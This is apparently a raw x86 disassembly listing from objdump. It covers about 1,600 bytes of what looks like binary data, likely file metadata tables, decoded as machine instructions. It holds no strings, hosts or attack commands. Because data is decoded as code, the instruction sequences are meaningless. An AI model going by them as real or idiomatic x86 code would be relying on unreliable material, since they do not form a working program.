  405cf4:	c9                   	leave
  405cf5:	1f                   	pop    %ds
  405cf6:	e2 0a                	loop   0x405d02
  405cf8:	06                   	push   %es
  405cf9:	00 33                	add    %dh,(%ebx)
  405cfb:	16                   	push   %ss
  405cfc:	2b 00                	sub    (%eax),%eax
  405cfe:	06                   	push   %es
  405cff:	00 e0                	add    %ah,%al
  405d01:	0e                   	push   %cs
  405d02:	66 05 06 00          	add    $0x6,%ax
  405d06:	b0 17                	mov    $0x17,%al
  405d08:	66 05 06 00          	add    $0x6,%ax
  405d0c:	ba 0d 66 05 06       	mov    $0x605660d,%edx
  405d11:	00 56 1d             	add    %dl,0x1d(%esi)
  405d14:	66 05 06 00          	add    $0x6,%ax
  405d18:	b9 1a 66 05 16       	mov    $0x1605661a,%ecx
  405d1d:	00 d2                	add    %dl,%dl
  405d1f:	1a a3 1e 1a 00 fc    	sbb    -0x3ffe5e2(%ebx),%ah
  405d25:	1c 63                	sbb    $0x63,%al
  405d27:	22 1a                	and    (%edx),%bl
  405d29:	00 dd                	add    %bl,%ch
  405d2b:	19 63 22             	sbb    %esp,0x22(%ebx)
  405d2e:	8b 01                	mov    (%ecx),%eax
  405d30:	a1 1d 00 00 1a       	mov    0x1a00001d,%eax
  405d35:	00 4e 21             	add    %cl,0x21(%esi)
  405d38:	63 22                	arpl   %esp,(%edx)
  405d3a:	06                   	push   %es
  405d3b:	00 42 1e             	add    %al,0x1e(%edx)
  405d3e:	20 18                	and    %bl,(%eax)
  405d40:	06                   	push   %es
  405d41:	00 46 00             	add    %al,0x0(%esi)
  405d44:	20 18                	and    %bl,(%eax)
  405d46:	06                   	push   %es
  405d47:	00 17                	add    %dl,(%edi)
  405d49:	18 20                	sbb    %ah,(%eax)
  405d4b:	18 06                	sbb    %al,(%esi)
  405d4d:	00 68 00             	add    %ch,0x0(%eax)
  405d50:	20 18                	and    %bl,(%eax)
  405d52:	06                   	push   %es
  405d53:	00 43 1c             	add    %al,0x1c(%ebx)
  405d56:	9f                   	lahf
  405d57:	25 06 00 67 18       	and    $0x18670006,%eax
  405d5c:	9f                   	lahf
  405d5d:	25 06 00 c7 0f       	and    $0xfc70006,%eax
  405d62:	20 18                	and    %bl,(%eax)
  405d64:	06                   	push   %es
  405d65:	00 da                	add    %bl,%dl
  405d67:	18 20                	sbb    %ah,(%eax)
  405d69:	18 1e                	sbb    %bl,(%esi)
  405d6b:	00 86 19 19 20 06    	add    %al,0x6201919(%esi)
  405d71:	00 31                	add    %dh,(%ecx)
  405d73:	26 0c 17             	es or  $0x17,%al
  405d76:	06                   	push   %es
  405d77:	00 26                	add    %ah,(%esi)
  405d79:	17                   	pop    %ss
  405d7a:	0c 17                	or     $0x17,%al
  405d7c:	06                   	push   %es
  405d7d:	00 ee                	add    %ch,%dh
  405d7f:	0e                   	push   %cs
  405d80:	0c 17                	or     $0x17,%al
  405d82:	06                   	push   %es
  405d83:	00 05 0c 20 18 06    	add    %al,0x618200c
  405d89:	00 cc                	add    %cl,%ah
  405d8b:	0e                   	push   %cs
  405d8c:	c5 13                	lds    (%ebx),%edx
  405d8e:	0a 00                	or     (%eax),%al
  405d90:	15 1d 2b 00 0a       	adc    $0xa002b1d,%eax
  405d95:	00 d9                	add    %bl,%cl
  405d97:	20 2b                	and    %ch,(%ebx)
  405d99:	00 06                	add    %al,(%esi)
  405d9b:	00 3e                	add    %bh,(%esi)
  405d9d:	0d 2b 00 43 00       	or     $0x43002b,%eax
  405da2:	de 1d 00 00 12 00    	ficomps 0x120000
  405da8:	5a                   	pop    %edx
  405da9:	0e                   	push   %cs
  405daa:	f5                   	cmc
  405dab:	1b 06                	sbb    (%esi),%eax
  405dad:	00 0b                	add    %cl,(%ebx)
  405daf:	00 c7                	add    %al,%bh
  405db1:	0a 06                	or     (%esi),%al
  405db3:	00 17                	add    %dl,(%edi)
  405db5:	19 20                	sbb    %esp,(%eax)
  405db7:	18 06                	sbb    %al,(%esi)
  405db9:	00 bc 25 b1 19 06 00 	add    %bh,0x619b1(%ebp,%eiz,1)
  405dc0:	3d 10 20 18 06       	cmp    $0x6182010,%eax
  405dc5:	00 e9                	add    %ch,%cl
  405dc7:	1d 20 18 06 00       	sbb    $0x61820,%eax
  405dcc:	a8 0e                	test   $0xe,%al
  405dce:	20 18                	and    %bl,(%eax)
  405dd0:	22 00                	and    (%eax),%al
  405dd2:	df 1a                	fistps (%edx)
  405dd4:	9c                   	pushf
  405dd5:	1c 22                	sbb    $0x22,%al
  405dd7:	00 9f 1f 9c 1c 22    	add    %bl,0x221c9c1f(%edi)
  405ddd:	00 c3                	add    %al,%bl
  405ddf:	1c 9c                	sbb    $0x9c,%al
  405de1:	1c 12                	sbb    $0x12,%al
  405de3:	00 bb 1c e0 1e 22    	add    %bh,0x221ee01c(%ebx)
  405de9:	00 b7 1f 9c 1c 06    	add    %dh,0x61c9c1f(%edi)
  405def:	00 76 1f             	add    %dh,0x1f(%esi)
  405df2:	9f                   	lahf
  405df3:	25 06 00 32 1a       	and    $0x1a320006,%eax
  405df8:	20 18                	and    %bl,(%eax)
  405dfa:	06                   	push   %es
  405dfb:	00 7d 1f             	add    %bh,0x1f(%ebp)
  405dfe:	9f                   	lahf
  405dff:	25 12 00 75 1c       	and    $0x1c750012,%eax
  405e04:	9f                   	lahf
  405e05:	25 06 00 d3 17       	and    $0x17d30006,%eax
  405e0a:	9f                   	lahf
  405e0b:	25 06 00 7f 00       	and    $0x7f0006,%eax
  405e10:	9f                   	lahf
  405e11:	25 06 00 1c 1a       	and    $0x1a1c0006,%eax
  405e16:	20 18                	and    %bl,(%eax)
  405e18:	06                   	push   %es
  405e19:	00 40 18             	add    %al,0x18(%eax)
  405e1c:	9f                   	lahf
  405e1d:	25 06 00 ff 0d       	and    $0xdff0006,%eax
  405e22:	9f                   	lahf
  405e23:	25 06 00 c3 0d       	and    $0xdc30006,%eax
  405e28:	9f                   	lahf
  405e29:	25 06 00 99 18       	and    $0x18990006,%eax
  405e2e:	9f                   	lahf
  405e2f:	25 06 00 de 0d       	and    $0xdde0006,%eax
  405e34:	9f                   	lahf
  405e35:	25 06 00 05 1a       	and    $0x1a050006,%eax
  405e3a:	9f                   	lahf
  405e3b:	25 06 00 d9 1c       	and    $0x1cd90006,%eax
  405e40:	20 18                	and    %bl,(%eax)
  405e42:	06                   	push   %es
  405e43:	00 4c 25 20          	add    %cl,0x20(%ebp,%eiz,1)
  405e47:	18 06                	sbb    %al,(%esi)
  405e49:	00 72 20             	add    %dh,0x20(%edx)
  405e4c:	e0 1e                	loopne 0x405e6c
  405e4e:	06                   	push   %es
  405e4f:	00 85 0e 20 18 06    	add    %al,0x618200e(%ebp)
  405e55:	00 b4 0b 9f 25 06 00 	add    %dh,0x6259f(%ebx,%ecx,1)
  405e5c:	5f                   	pop    %edi
  405e5d:	00 20                	add    %ah,(%eax)
  405e5f:	18 06                	sbb    %al,(%esi)
  405e61:	00 73 0e             	add    %dh,0xe(%ebx)
  405e64:	20 18                	and    %bl,(%eax)
  405e66:	06                   	push   %es
  405e67:	00 d9                	add    %bl,%cl
  405e69:	0e                   	push   %cs
  405e6a:	20 18                	and    %bl,(%eax)
  405e6c:	06                   	push   %es
  405e6d:	00 91 20 66 05 06    	add    %dl,0x6056620(%ecx)
  405e73:	00 42 10             	add    %al,0x10(%edx)
  405e76:	66 05 0a 00          	add    $0xa,%ax
  405e7a:	e0 17                	loopne 0x405e93
  405e7c:	70 19                	jo     0x405e97
  405e7e:	0a 00                	or     (%eax),%al
  405e80:	ef                   	out    %eax,(%dx)
  405e81:	0d 70 19 00 00       	or     $0x1970,%eax
  405e86:	00 00                	add    %al,(%eax)
  405e88:	93                   	xchg   %eax,%ebx
  405e89:	00 00                	add    %al,(%eax)
  405e8b:	00 00                	add    %al,(%eax)
  405e8d:	00 01                	add    %al,(%ecx)
  405e8f:	00 01                	add    %al,(%ecx)
  405e91:	00 01                	add    %al,(%ecx)
  405e93:	00 10                	add    %dl,(%eax)
  405e95:	00 c8                	add    %cl,%al
  405e97:	04 d2                	add    $0xd2,%al
  405e99:	00 05 00 01 00 01    	add    %al,0x1000100
  405e9f:	00 81 01 10 00 65    	add    %al,0x65001001(%ecx)
  405ea5:	1e                   	push   %ds
  405ea6:	d2 00                	rolb   %cl,(%eax)
  405ea8:	05 00 01 00 03       	add    $0x3000100,%eax
  405ead:	00 81 01 10 00 96    	add    %al,-0x69ffefff(%ecx)
  405eb3:	17                   	pop    %ss
  405eb4:	cc                   	int3
  405eb5:	18 05 00 13 00 06    	sbb    %al,0x6001300
  405ebb:	00 00                	add    %al,(%eax)
  405ebd:	00 10                	add    %dl,(%eax)
  405ebf:	00 4f 1a             	add    %cl,0x1a(%edi)
  405ec2:	72 03                	jb     0x405ec7
  405ec4:	05 00 1e 00 24       	add    $0x24001e00,%eax
  405ec9:	00 00                	add    %al,(%eax)
  405ecb:	00 10                	add    %dl,(%eax)
  405ecd:	00 ef                	add    %ch,%bh
  405ecf:	05 6f 0d 05 00       	add    $0x50d6f,%eax
  405ed4:	1e                   	push   %ds
  405ed5:	00 26                	add    %ah,(%esi)
  405ed7:	00 81 01 10 00 f1    	add    %al,-0xeffefff(%ecx)
  405edd:	02 6f 0d             	add    0xd(%edi),%ch
  405ee0:	05 00 1e 00 2d       	add    $0x2d001e00,%eax
  405ee5:	00 81 01 10 00 49    	add    %al,0x49001001(%ecx)
  405eeb:	1e                   	push   %ds
  405eec:	6f                   	outsl  %ds:(%esi),(%dx)
  405eed:	0d 05 00 1e 00       	or     $0x1e0005,%eax
  405ef2:	2f                   	das
  405ef3:	00 81 01 10 00 90    	add    %al,-0x6fffefff(%ecx)
  405ef9:	09 6f 0d             	or     %ebp,0xd(%edi)
  405efc:	05 00 1e 00 30       	add    $0x30001e00,%eax
  405f01:	00 81 01 10 00 32    	add    %al,0x32001001(%ecx)
  405f07:	09 6f 0d             	or     %ebp,0xd(%edi)
  405f0a:	05 00 1e 00 36       	add    $0x36001e00,%eax
  405f0f:	00 81 01 10 00 dc    	add    %al,-0x23ffefff(%ecx)
  405f15:	05 6f 0d 05 00       	add    $0x50d6f,%eax
  405f1a:	1f                   	pop    %ds
  405f1b:	00 38                	add    %bh,(%eax)
  405f1d:	00 02                	add    %al,(%edx)
  405f1f:	01 00                	add    %eax,(%eax)
  405f21:	00 c0                	add    %al,%al
  405f23:	26 00 00             	add    %al,%es:(%eax)
  405f26:	39 00                	cmp    %eax,(%eax)
  405f28:	1f                   	pop    %ds
  405f29:	00 3e                	add    %bh,(%esi)
  405f2b:	00 81 01 10 00 f0    	add    %al,-0xfffefff(%ecx)
  405f31:	0b 6f 0d             	or     0xd(%edi),%ebp
  405f34:	05 00 23 00 3e       	add    $0x3e002300,%eax
  405f39:	00 81 01 10 00 24    	add    %al,0x24001001(%ecx)
  405f3f:	09 6f 0d             	or     %ebp,0xd(%edi)
  405f42:	05 00 23 00 41       	add    $0x41002300,%eax
  405f47:	00 81 01 10 00 87    	add    %al,-0x78ffefff(%ecx)
  405f4d:	02 31                	add    (%ecx),%dh
  405f4f:	0b 05 00 24 00 46    	or     0x46002400,%eax
  405f55:	00 83 01 10 00 24    	add    %al,0x24001001(%ebx)
  405f5b:	02 00                	add    (%eax),%al
  405f5d:	00 05 00 25 00 4b    	add    %al,0x4b002500
  405f63:	00 01                	add    %al,(%ecx)
  405f65:	00 10                	add    %dl,(%eax)
  405f67:	00 a1 04 2d 05 05    	add    %ah,0x5052d04(%ecx)
  405f6d:	00 26                	add    %ah,(%esi)
  405f6f:	00 4b 00             	add    %cl,0x0(%ebx)
  405f72:	81 01 10 00 e2 02    	addl   $0x2e20010,(%ecx)
  405f78:	2d 05 05 00 2d       	sub    $0x2d000505,%eax
  405f7d:	00 52 00             	add    %dl,0x0(%edx)
  405f80:	00 01                	add    %al,(%ecx)
  405f82:	00 00                	add    %al,(%eax)
  405f84:	68 1a 00 00 05       	push   $0x500001a
  405f89:	00 2d 00 54 00 13    	add    %ch,0x13005400
  405f8f:	01 00                	add    %eax,(%eax)
  405f91:	00 be 03 00 00 51    	add    %bh,0x51000003(%esi)
  405f97:	00 2e                	add    %ch,(%esi)
  405f99:	00 54 00 01          	add    %dl,0x1(%eax,%eax,1)
  405f9d:	00 10                	add    %dl,(%eax)
  405f9f:	00 cb                	add    %cl,%bl
  405fa1:	16                   	push   %ss
  405fa2:	33 06                	xor    (%esi),%eax
  405fa4:	05 00 2e 00 54       	add    $0x54002e00,%eax
  405fa9:	00 01                	add    %al,(%ecx)
  405fab:	00 10                	add    %dl,(%eax)
  405fad:	00 26                	add    %ah,(%esi)
  405faf:	08 33                	or     %dh,(%ebx)
  405fb1:	06                   	push   %es
  405fb2:	05 00 2f 00 5f       	add    $0x5f002f00,%eax
  405fb7:	00 01                	add    %al,(%ecx)
  405fb9:	00 10                	add    %dl,(%eax)
  405fbb:	00 d9                	add    %bl,%cl
  405fbd:	26 33 06             	xor    %es:(%esi),%eax
  405fc0:	05 00 31 00 63       	add    $0x63003100,%eax
  405fc5:	00 01                	add    %al,(%ecx)
  405fc7:	00 10                	add    %dl,(%eax)
  405fc9:	00 22                	add    %ah,(%edx)
  405fcb:	25 33 06 05 00       	and    $0x50633,%eax
  405fd0:	33 00                	xor    (%eax),%eax
  405fd2:	6a 00                	push   $0x0
  405fd4:	01 01                	add    %eax,(%ecx)
  405fd6:	00 00                	add    %al,(%eax)
  405fd8:	da 01                	fiaddl (%ecx)
  405fda:	33 06                	xor    (%esi),%eax
  405fdc:	39 00                	cmp    %eax,(%eax)
  405fde:	3a 00                	cmp    (%eax),%al
  405fe0:	95                   	xchg   %eax,%ebp
  405fe1:	00 00                	add    %al,(%eax)
  405fe3:	00 10                	add    %dl,(%eax)
  405fe5:	00 e2                	add    %ah,%dl
  405fe7:	18 33                	sbb    %dh,(%ebx)
  405fe9:	06                   	push   %es
  405fea:	05 00 47 00 95       	add    $0x95004700,%eax
  405fef:	00 00                	add    %al,(%eax)
  405ff1:	00 10                	add    %dl,(%eax)
  405ff3:	00 01                	add    %al,(%ecx)
  405ff5:	1c 33                	sbb    $0x33,%al
  405ff7:	06                   	push   %es
  405ff8:	05 00 47 00 99       	add    $0x99004700,%eax
  405ffd:	00 81 01 10 00 bf    	add    %al,-0x40ffefff(%ecx)
  406003:	01 33                	add    %esi,(%ebx)
  406005:	06                   	push   %es
  406006:	05 00 47 00 a2       	add    $0xa2004700,%eax
  40600b:	00 00                	add    %al,(%eax)
  40600d:	01 00                	add    %eax,(%eax)
  40600f:	00 f2                	add    %dh,%dl
  406011:	14 00                	adc    $0x0,%al
  406013:	00 05 00 47 00 a4    	add    %al,0xa4004700
  406019:	00 13                	add    %dl,(%ebx)
  40601b:	01 00                	add    %eax,(%eax)
  40601d:	00 c8                	add    %cl,%al
  40601f:	09 00                	or     %eax,(%eax)
  406021:	00 51 00             	add    %dl,0x0(%ecx)
  406024:	48                   	dec    %eax
  406025:	00 a4 00 16 00 39 0a 	add    %ah,0xa390016(%eax,%eax,1)
  40602c:	12 00                	adc    (%eax),%al
  40602e:	16                   	push   %ss
  40602f:	00 aa 08 12 00 16    	add    %ch,0x16001208(%edx)
  406035:	00 d7                	add    %dl,%bh
  406037:	04 12                	add    $0x12,%al
  406039:	00 16                	add    %dl,(%esi)
  40603b:	00 87 0b 12 00 16    	add    %al,0x1600120b(%edi)
  406041:	00 d9                	add    %bl,%cl
  406043:	14 12                	adc    $0x12,%al
  406045:	00 16                	add    %dl,(%esi)
  406047:	00 36                	add    %dh,(%esi)
  406049:	1e                   	push   %ds
  40604a:	12 00                	adc    (%eax),%al
  40604c:	16                   	push   %ss
  40604d:	00 1d 1b 12 00 16    	add    %bl,0x1600121b
  406053:	00 8a 01 12 00 16    	add    %cl,0x16001201(%edx)
  406059:	00 85 04 12 00 16    	add    %al,0x16001204(%ebp)
  40605f:	00 3f                	add    %bh,(%edi)
  406061:	02 12                	add    (%edx),%dl
  406063:	00 16                	add    %dl,(%esi)
  406065:	00 cb                	add    %cl,%bl
  406067:	03 15 00 16 00 80    	add    0x80001600,%edx
  40606d:	09 12                	or     %edx,(%edx)
  40606f:	00 16                	add    %dl,(%esi)
  406071:	00 4e 06             	add    %cl,0x6(%esi)
  406074:	19 00                	sbb    %eax,(%eax)
  406076:	16                   	push   %ss
  406077:	00 52 04             	add    %dl,0x4(%edx)
  40607a:	12 00                	adc    (%eax),%al
  40607c:	16                   	push   %ss
  40607d:	00 f0                	add    %dh,%al
  40607f:	08 12                	or     %dl,(%edx)
  406081:	00 16                	add    %dl,(%esi)
  406083:	00 f4                	add    %dh,%ah
  406085:	06                   	push   %es
  406086:	12 00                	adc    (%eax),%al
  406088:	16                   	push   %ss
  406089:	00 cf                	add    %cl,%bh
  40608b:	06                   	push   %es
  40608c:	12 00                	adc    (%eax),%al
  40608e:	16                   	push   %ss
  40608f:	00 2b                	add    %ch,(%ebx)
  406091:	0a 12                	or     (%edx),%dl
  406093:	00 11                	add    %dl,(%ecx)
  406095:	00 1c 0d 21 00 11 00 	add    %bl,0x110021(,%ecx,1)
  40609c:	01 0d 25 00 11 00    	add    %ecx,0x110025
  4060a2:	d1 0c 29             	rorl   $1,(%ecx,%ebp,1)
  4060a5:	00 11                	add    %dl,(%ecx)
  4060a7:	00 67 0c             	add    %ah,0xc(%edi)
  4060aa:	2d 00 11 00 e9       	sub    $0xe9001100,%eax
  4060af:	0c 2d                	or     $0x2d,%al
  4060b1:	00 11                	add    %dl,(%ecx)
  4060b3:	00 4c 0c 30          	add    %cl,0x30(%esp,%ecx,1)
  4060b7:	00 11                	add    %dl,(%ecx)
  4060b9:	00 2f                	add    %ch,(%edi)
  4060bb:	0c 34                	or     $0x34,%al
  4060bd:	00 31                	add    %dh,(%ecx)
  4060bf:	00 15 0c 37 00 11    	add    %dl,0x1100370c
  4060c5:	00 83 0c 30 00 11    	add    %al,0x1100300c(%ebx)
  4060cb:	00 b7 0c 3a 00 11    	add    %dh,0x11003a0c(%edi)
  4060d1:	00 99 0c 34 00 16    	add    %bl,0x1600340c(%ecx)
  4060d7:	00 39                	add    %bh,(%ecx)
  4060d9:	01 dc                	add    %ebx,%esp
  4060db:	00 06                	add    %al,(%esi)
  4060dd:	06                   	push   %es
  4060de:	a3 09 06 01 56       	mov    %eax,0x56010609
  4060e3:	80 d7 16             	adc    $0x16,%bh
  4060e6:	09 01                	or     %eax,(%ecx)
  4060e8:	56                   	push   %esi
  4060e9:	80 d0 23             	adc    $0x23,%al
  4060ec:	09 01                	or     %eax,(%ecx)
  4060ee:	56                   	push   %esi
  4060ef:	80 82 15 09 01 31 00 	addb   $0x0,0x31010915(%edx)
  4060f6:	fa                   	cli
  4060f7:	07                   	pop    %es
  4060f8:	12 00                	adc    (%eax),%al
  4060fa:	16                   	push   %ss
  4060fb:	00 bc 05 30 01 16 00 	add    %bh,0x160130(%ebp,%eax,1)
  406102:	a1 02 43 01 51       	mov    0x51014302,%eax
  406107:	80 19 03             	sbbb   $0x3,(%ecx)
  40610a:	3a 00                	cmp    (%eax),%al
  40610c:	51                   	push   %ecx
  40610d:	80 03 1b             	addb   $0x1b,(%ebx)
  406110:	3a 00                	cmp    (%eax),%al
  406112:	51                   	push   %ecx
  406113:	80 76 07 3a          	xorb   $0x3a,0x7(%esi)
  406117:	00 51 80             	add    %dl,-0x80(%ecx)
  40611a:	59                   	pop    %ecx
  40611b:	02 3a                	add    (%edx),%bh
  40611d:	00 21                	add    %ah,(%ecx)
  40611f:	00 ad 02 29 00 21    	add    %ch,0x21002902(%ebp)
  406125:	00 57 05             	add    %dl,0x5(%edi)
  406128:	29 00                	sub    %eax,(%eax)
  40612a:	31 00                	xor    %eax,(%eax)
  40612c:	51                   	push   %ecx
  40612d:	17                   	pop    %ss
  40612e:	29 00                	sub    %eax,(%eax)
  406130:	33 01                	xor    (%ecx),%eax
  406132:	6f                   	outsl  %ds:(%esi),(%dx)
  406133:	04 8b                	add    $0x8b,%al
  406135:	01 11                	add    %edx,(%ecx)
  406137:	00 28                	add    %ch,(%eax)
  406139:	1e                   	push   %ds
  40613a:	8f 01                	pop    (%ecx)
  40613c:	01 00                	add    %eax,(%eax)
  40613e:	7a 18                	jp     0x406158
  406140:	30 01                	xor    %al,(%ecx)
  406142:	01 00                	add    %eax,(%eax)
  406144:	af                   	scas   %es:(%edi),%eax
  406145:	24 3a                	and    $0x3a,%al
  406147:	00 01                	add    %al,(%ecx)
  406149:	00 7a 18             	add    %bh,0x18(%edx)
  40614c:	30 01                	xor    %al,(%ecx)
  40614e:	01 00                	add    %eax,(%eax)
  406150:	7a 04                	jp     0x406156
  406152:	c7 01 01 00 94 04    	movl   $0x4940001,(%ecx)
  406158:	12 00                	adc    (%eax),%al
  40615a:	01 00                	add    %eax,(%eax)
  40615c:	93                   	xchg   %eax,%ebx
  40615d:	26 12 00             	adc    %es:(%eax),%al
  406160:	01 00                	add    %eax,(%eax)
  406162:	89 24 37             	mov    %esp,(%edi,%esi,1)
  406165:	00 01                	add    %al,(%ecx)
  406167:	00 76 1e             	add    %dh,0x1e(%esi)
  40616a:	02 02                	add    (%edx),%al
  40616c:	01 00                	add    %eax,(%eax)
  40616e:	67 0a c7             	addr16 or %bh,%al
  406171:	01 01                	add    %eax,(%ecx)
  406173:	00 7a 18             	add    %bh,0x18(%edx)
  406176:	30 01                	xor    %al,(%ecx)
  406178:	01 00                	add    %eax,(%eax)
  40617a:	e7 14                	out    %eax,$0x14
  40617c:	06                   	push   %es
  40617d:	02 06                	add    (%esi),%al
  40617f:	06                   	push   %es
  406180:	a3 09 3a 00 56       	mov    %eax,0x56003a09
  406185:	80 e7 06             	and    $0x6,%bh
  406188:	02 02                	add    (%edx),%al
  40618a:	56                   	push   %esi
  40618b:	80 e6 01             	and    $0x1,%dh
  40618e:	02 02                	add    (%edx),%al
  406190:	56                   	push   %esi
  406191:	80 a1 15 02 02 56 80 	andb   $0x80,0x56020215(%ecx)
  406198:	79 0b                	jns    0x4061a5
  40619a:	02 02                	add    (%edx),%al
  40619c:	56                   	push   %esi
  40619d:	80 50 0d 02          	adcb   $0x2,0xd(%eax)
  4061a1:	02 56 80             	add    -0x80(%esi),%dl
  4061a4:	d6                   	salc
  4061a5:	02 02                	add    (%edx),%al
  4061a7:	02 56 80             	add    -0x80(%esi),%dl
  4061aa:	42                   	inc    %edx
  4061ab:	0b 02                	or     (%edx),%eax
  4061ad:	02 56 80             	add    -0x80(%esi),%dl
  4061b0:	fa                   	cli
  4061b1:	18 02                	sbb    %al,(%edx)
  4061b3:	02 56 80             	add    -0x80(%esi),%dl
  4061b6:	07                   	pop    %es
  4061b7:	05 02 02 56 80       	add    $0x80560202,%eax
  4061bc:	13 25 02 02 56 80    	adc    0x80560202,%esp
  4061c2:	10 04 02             	adc    %al,(%edx,%eax,1)
  4061c5:	02 56 80             	add    -0x80(%esi),%dl
  4061c8:	be 18 02 02 33       	mov    $0x33020218,%esi
  4061cd:	01 44 07 fd          	add    %eax,-0x3(%edi,%eax,1)
  4061d1:	02 08                	add    (%eax),%cl
  4061d3:	26 00 00             	add    %al,%es:(%eax)
  4061d6:	00 00                	add    %al,(%eax)
  4061d8:	96                   	xchg   %eax,%esi
  4061d9:	00 08                	add    %cl,(%eax)
  4061db:	19 0a                	sbb    %ecx,(%edx)
  4061dd:	00 01                	add    %al,(%ecx)
  4061df:	00 78 20             	add    %bh,0x20(%eax)
  4061e2:	00 00                	add    %al,(%eax)
  4061e4:	00 00                	add    %al,(%eax)
  4061e6:	86 18                	xchg   %bl,(%eax)
  4061e8:	f3 1d 0e 00 01 00    	repz sbb $0x1000e,%eax
  4061ee:	f8                   	clc
  4061ef:	26 00 00             	add    %al,%es:(%eax)
  4061f2:	00 00                	add    %al,(%eax)
  4061f4:	96                   	xchg   %eax,%esi
  4061f5:	00 13                	add    %dl,(%ebx)
  4061f7:	05 1d 00 01 00       	add    $0x1001d,%eax
  4061fc:	50                   	push   %eax
  4061fd:	28 00                	sub    %al,(%eax)
  4061ff:	00 00                	add    %al,(%eax)
  406201:	00 91 00 45 04 1d    	add    %dl,0x1d044500(%ecx)
  406207:	00 01                	add    %al,(%ecx)
  406209:	00 c0                	add    %al,%al
  40620b:	28 00                	sub    %al,(%eax)
  40620d:	00 00                	add    %al,(%eax)
  40620f:	00 91 18 f9 1d 0a    	add    %dl,0xa1df918(%ecx)
  406215:	00 01                	add    %al,(%ecx)
  406217:	00 80 20 00 00 00    	add    %al,0x20(%eax)
  40621d:	00 96 08 32 22 3d    	add    %dl,0x3d223208(%esi)
  406223:	00 01                	add    %al,(%ecx)
  406225:	00 87 20 00 00 00    	add    %al,0x20(%edi)
  40622b:	00 96 08 40 22 42    	add    %dl,0x42224008(%esi)
  406231:	00 01                	add    %al,(%ecx)
  406233:	00 8f 20 00 00 00    	add    %cl,0x20(%edi)
  406239:	00 96 08 16 22 48    	add    %dl,0x48221608(%esi)
  40623f:	00 02                	add    %al,(%edx)
  406241:	00 96 20 00 00 00    	add    %dl,0x20(%esi)
  406247:	00 96 08 24 22 4d    	add    %dl,0x4d222408(%esi)
  40624d:	00 02                	add    %al,(%edx)
  40624f:	00 9e 20 00 00 00    	add    %bl,0x20(%esi)
  406255:	00 91 08 ca 1c 53    	add    %dl,0x531cca08(%ecx)
  40625b:	00 03                	add    %al,(%ebx)
  40625d:	00 a5 20 00 00 00    	add    %ah,0x20(%ebp)
  406263:	00 91 08 d5 1c 58    	add    %dl,0x581cd508(%ecx)
  406269:	00 03                	add    %al,(%ebx)
  40626b:	00 ad 20 00 00 00    	add    %ch,0x20(%ebp)
  406271:	00 91 08 c9 12 5e    	add    %dl,0x5e12c908(%ecx)
  406277:	00 04 00             	add    %al,(%eax,%eax,1)
  40627a:	b4 20                	mov    $0x20,%ah
  40627c:	00 00                	add    %al,(%eax)
  40627e:	00 00                	add    %al,(%eax)
  406280:	91                   	xchg   %eax,%ecx
  406281:	08 d8                	or     %bl,%al
  406283:	12 62 00             	adc    0x0(%edx),%ah
  406286:	04 00                	add    $0x0,%al
  406288:	bc 20 00 00 00       	mov    $0x20,%esp
  40628d:	00 91 08 b5 21 5e    	add    %dl,0x5e21b508(%ecx)
  406293:	00 05 00 c3 20 00    	add    %al,0x20c300
  406299:	00 00                	add    %al,(%eax)
  40629b:	00 91 08 c0 21 62    	add    %dl,0x6221c008(%ecx)
  4062a1:	00 05 00 cb 20 00    	add    %al,0x20cb00
  4062a7:	00 00                	add    %al,(%eax)
  4062a9:	00 91 08 8a 12 67    	add    %dl,0x67128a08(%ecx)
  4062af:	00 06                	add    %al,(%esi)
  4062b1:	00 d2                	add    %dl,%dl
  4062b3:	20 00                	and    %al,(%eax)
  4062b5:	00 00                	add    %al,(%eax)
  4062b7:	00 91 08 98 12 6c    	add    %dl,0x6c129808(%ecx)
  4062bd:	00 06                	add    %al,(%esi)
  4062bf:	00 da                	add    %bl,%dl
  4062c1:	20 00                	and    %al,(%eax)
  4062c3:	00 00                	add    %al,(%eax)
  4062c5:	00 96 08 d0 0b 1d    	add    %dl,0x1d0bd008(%esi)
  4062cb:	00 07                	add    %al,(%edi)
  4062cd:	00 e1                	add    %ah,%cl
  4062cf:	20 00                	and    %al,(%eax)
  4062d1:	00 00                	add    %al,(%eax)
  4062d3:	00 96 08 e0 0b 72    	add    %dl,0x720be008(%esi)
  4062d9:	00 07                	add    %al,(%edi)
  4062db:	00 e9                	add    %ch,%cl
  4062dd:	20 00                	and    %al,(%eax)
  4062df:	00 00                	add    %al,(%eax)
  4062e1:	00 91 08 08 0b 77    	add    %dl,0x770b0808(%ecx)
  4062e7:	00 08                	add    %cl,(%eax)
  4062e9:	00 f0                	add    %dh,%al
  4062eb:	20 00                	and    %al,(%eax)
  4062ed:	00 00                	add    %al,(%eax)
  4062ef:	00 91 08 b3 13 67    	add    %dl,0x6713b308(%ecx)
  4062f5:	00 08                	add    %cl,(%eax)
  4062f7:	00 f7                	add    %dh,%bh
  4062f9:	20 00                	and    %al,(%eax)
  4062fb:	00 00                	add    %al,(%eax)
  4062fd:	00 91 08 bc 13 6c    	add    %dl,0x6c13bc08(%ecx)
  406303:	00 08                	add    %cl,(%eax)
  406305:	00 ff                	add    %bh,%bh
  406307:	20 00                	and    %al,(%eax)
  406309:	00 00                	add    %al,(%eax)
  40630b:	00 96 08 37 17 7b    	add    %dl,0x7b173708(%esi)
  406311:	00 09                	add    %cl,(%ecx)
  406313:	00 06                	add    %al,(%esi)
  406315:	21 00                	and    %eax,(%eax)
  406317:	00 00                	add    %al,(%eax)
  406319:	00 96 08 44 17 7f    	add    %dl,0x7f174408(%esi)
  40631f:	00 09                	add    %cl,(%ecx)
  406321:	00 0e                	add    %cl,(%esi)
  406323:	21 00                	and    %eax,(%eax)
  406325:	00 00                	add    %al,(%eax)
  406327:	00 96 08 a7 14 1d    	add    %dl,0x1d14a708(%esi)
  40632d:	00 0a                	add    %cl,(%edx)
  40632f:	00 15 21 00 00 00    	add    %dl,0x21
  406335:	00 96 08 b8 14 72    	add    %dl,0x7214b808(%esi)
  40633b:	00 0a                	add    %cl,(%edx)
  40633d:	00 6c 29 00          	add    %ch,0x0(%ecx,%ebp,1)
  406341:	00 00                	add    %al,(%eax)
  406343:	00 96 00 29 04 0a    	add    %dl,0xa042900(%esi)
  406349:	00 0b                	add    %cl,(%ebx)
  40634b:	00 1d 21 00 00 00    	add    %bl,0x21
  406351:	00 91 00 53 0a 84    	add    %dl,-0x7bf5ad00(%ecx)
  406357:	00 0b                	add    %cl,(%ebx)
  406359:	00 28                	add    %ch,(%eax)
  40635b:	21 00                	and    %eax,(%eax)
  40635d:	00 00                	add    %al,(%eax)
